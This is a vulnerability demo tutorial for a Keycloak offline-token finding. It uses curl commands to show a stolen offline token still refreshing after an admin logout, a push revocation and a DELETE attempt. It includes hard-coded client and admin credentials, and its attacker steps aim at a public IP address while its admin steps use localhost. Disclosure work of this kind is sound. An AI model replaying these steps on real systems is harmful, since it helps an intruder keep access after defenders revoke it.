# Tutorial: Finding #3 — Offline Token Persistence After Admin Revocation

**Severity:** HIGH (CVSS 7.5)
**Demo time:** ~8 minutes
**Requirements:** Terminal + Browser (Admin Console)

---

## Attack Scenario

1. **Attacker** steals user password → obtains offline token
2. **Security team** detects breach → admin force logs out all sessions
3. **Attacker** still has access because the offline token is not revoked!

---

## Step 0: Ensure Keycloak is Running

```bash
curl -s http://localhost:8080/realms/test | python3 -c "import sys,json; print('Keycloak OK:', json.load(sys.stdin)['realm'])"
```

---

## Step 1: (ATTACKER) Login and Obtain Offline Token

Attacker uses stolen credentials:

```bash
OFFLINE_RESP=$(curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential" \
  -d "client_secret=mysecret123" \
  -d "grant_type=password" \
  -d "username=testuser" \
  -d "password=Password123" \
  -d "scope=offline_access")

echo "$OFFLINE_RESP" | python3 -m json.tool | head -10
```

Save offline token:
```bash
OFFLINE_TOKEN=$(echo "$OFFLINE_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['refresh_token'])")
echo "Offline token: ${OFFLINE_TOKEN:0:60}..."
```

Verify token type = "Offline":
```bash
echo "$OFFLINE_RESP" | python3 -c "
import sys,json,base64
d = json.load(sys.stdin)
payload = d['refresh_token'].split('.')[1] + '=='
claims = json.loads(base64.b64decode(payload))
print('Token type:', claims.get('typ'))
"
```
Output: `Token type: Offline`

---

## Step 2: (ATTACKER) Verify Token Works

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential" \
  -d "client_secret=mysecret123" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$OFFLINE_TOKEN" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('Token valid:', 'access_token' in d)"
```
Output: `Token valid: True`

> Attacker successfully obtained a new access token using the offline token.

---

## Step 3: (ADMIN) Detect Breach — Force Logout All Sessions

### 3a. Via Admin Console (Browser):
1. Open: `http://46.101.162.187:8080/admin/master/console/`
2. Login: `admin` / `Admin1234`
3. Select realm **test**
4. Click **Users** → search for **testuser** → click
5. Tab **Sessions** → click **Sign out all sessions** (or **Logout all sessions**)

### 3b. Or via CLI:

```bash
# Get admin token
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Get user ID
USER_ID=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/users?username=testuser" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")
echo "User ID: $USER_ID"

# Force logout all sessions
curl -s -o /dev/null -w "Force logout: HTTP %{http_code}\n" -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/users/$USER_ID/logout"
```
Output: `Force logout: HTTP 204` (success)

Verify active sessions are gone:
```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/users/$USER_ID/sessions" \
  | python3 -c "import sys,json; print('Active sessions:', len(json.load(sys.stdin)))"
```
Output: `Active sessions: 0`

> Admin successfully logged out all sessions. Should be safe now, right?

---

## Step 4: (ATTACKER) Test Offline Token — STILL WORKS!

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential" \
  -d "client_secret=mysecret123" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$OFFLINE_TOKEN" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('AFTER FORCE LOGOUT:'); print('Token still valid:', 'access_token' in d)"
```

**Output (VULNERABLE):**
```
AFTER FORCE LOGOUT:
Token still valid: True
```

> **OFFLINE TOKEN STILL WORKS** even though admin already force logged out!

---

## Step 5: (ADMIN) Push Not-Before Revocation

Admin tries another approach — push revocation policy:

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/push-revocation"
```
Output: `{}`

---

## Step 6: (ATTACKER) Test Again — STILL WORKS!

```bash
curl -s -X POST http://46.101.162.187:8080/realms/test/protocol/openid-connect/token \
  -d "client_id=test-confidential" \
  -d "client_secret=mysecret123" \
  -d "grant_type=refresh_token" \
  -d "refresh_token=$OFFLINE_TOKEN" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print('AFTER PUSH REVOCATION:'); print('Token still valid:', 'access_token' in d)"
```

**Output (VULNERABLE):**
```
AFTER PUSH REVOCATION:
Token still valid: True
```

---

## Step 7: (ADMIN) Try DELETE Offline Session — FAILED 404!

```bash
ADMIN_TOKEN=$(curl -s -X POST http://localhost:8080/realms/master/protocol/openid-connect/token \
  -d "client_id=admin-cli&grant_type=password&username=admin&password=Admin1234" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

CLIENT_UUID=$(curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/clients?clientId=test-confidential" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")

curl -s -o /dev/null -w "DELETE offline sessions: HTTP %{http_code}\n" -X DELETE \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/users/$USER_ID/offline-sessions/$CLIENT_UUID"
```

**Output (VULNERABLE):**
```
DELETE offline sessions: HTTP 404
```

> Admin REST API cannot delete offline sessions — endpoint returns 404!

---

## Step 8: Show Offline Session Still Exists

```bash
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "http://localhost:8080/admin/realms/test/users/$USER_ID/offline-sessions/$CLIENT_UUID" \
  | python3 -c "import sys,json; sessions=json.load(sys.stdin); print(f'Active offline sessions: {len(sessions)}')"
```

Output: `Active offline sessions: X` (X > 0)

---

## Step 9: Run Python PoC (Fully Automated)

```bash
python3 pocs/poc_f3_offline_token.py --host http://localhost:8080
```

---

## Summary

| Admin Action | Effect on Offline Token | Status |
|---|---|---|
| Force logout (`POST /users/{id}/logout`) | **No effect** — token still valid | VULNERABLE |
| Push revocation (`POST /push-revocation`) | **No effect** — token still valid | VULNERABLE |
| DELETE offline session | **HTTP 404** — endpoint does not work | VULNERABLE |
| **Change user password** | Token revoked | Only mitigation |

**Conclusion:** Offline tokens grant PERMANENT access that cannot be revoked by the admin through any means except changing the user's password.
